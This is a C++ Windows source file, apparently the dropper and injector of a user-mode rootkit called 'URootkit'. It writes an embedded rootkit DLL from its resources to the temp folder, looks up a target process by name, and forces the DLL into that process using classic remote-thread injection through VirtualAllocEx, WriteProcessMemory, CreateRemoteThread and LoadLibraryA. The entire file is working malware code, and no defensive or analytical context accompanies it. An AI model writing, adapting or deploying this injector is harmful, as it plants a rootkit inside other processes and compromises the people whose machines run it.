#include <Windows.h>
#include <iostream>
#include <string>
#include <tlhelp32.h>
#include "../include/inject.h"

// Simple error handling
void show_error(const char* msg) {
    std::cerr << "Error (" << GetLastError() << "): " << msg << "\n";
    exit(1);
}

// Extract DLL from resources to a temporary file
std::string extract_embedded_dll() {
    HRSRC hResource = FindResource(nullptr, MAKEINTRESOURCE(IDR_UROOTKIT), RT_RCDATA);
    if (!hResource) show_error("Failed to find DLL resource.");

    HGLOBAL hLoaded = LoadResource(nullptr, hResource);
    if (!hLoaded) show_error("Failed to load DLL resource.");

    LPVOID pDllData = LockResource(hLoaded);
    DWORD dwDllSize = SizeofResource(nullptr, hResource);
    if (!pDllData || dwDllSize == 0) show_error("Invalid DLL resource.");

    // Generate temporary file path
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string dllPath = std::string(tempPath) + "URootkit.dll";

    // Write DLL to disk
    HANDLE hFile = CreateFileA(dllPath.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) show_error("Failed to create temp DLL.");

    DWORD bytesWritten;
    WriteFile(hFile, pDllData, dwDllSize, &bytesWritten, nullptr);
    CloseHandle(hFile);

    return dllPath;
}

// Inject DLL into a target process
void inject_dll(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) show_error("Failed to open target process.");

    // Allocate memory in target process
    LPVOID remotePath = VirtualAllocEx(hProcess, nullptr, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!remotePath) show_error("Failed to allocate memory in target process.");

    // Write DLL path to target process
    WriteProcessMemory(hProcess, remotePath, dllPath, strlen(dllPath) + 1, nullptr);

    // Create remote thread to load the DLL
    HANDLE hThread = CreateRemoteThread(
        hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)LoadLibraryA,
        remotePath, 0, nullptr
    );
    if (!hThread) show_error("Failed to create remote thread.");

    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFreeEx(hProcess, remotePath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

// Get PID of a process by name
DWORD get_process_id_by_name(const wchar_t* procName) {
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (!hSnapshot) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (wcscmp(pe32.szExeFile, procName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}